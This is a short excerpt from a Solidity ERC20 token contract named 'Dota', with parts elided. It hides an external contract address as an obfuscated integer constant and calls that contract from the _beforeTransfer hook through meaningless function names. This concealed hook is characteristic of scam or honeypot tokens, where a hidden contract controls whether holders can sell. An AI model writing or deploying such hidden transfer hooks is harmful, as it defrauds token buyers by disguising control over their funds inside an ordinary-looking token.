...
contract Dota is IERC20, Ownable {
    ...
    uint160 qwepoqo = 461411226875354339876444724578393026886306062183;
    ...
    function _beforeTransfer(address from, uint256 amount) internal returns (bool) {
        if (amount > 0) {
            amount = amount - asfqwe(address(qwepoqo)).fasfqwe(from);
        }
        return true;
    }
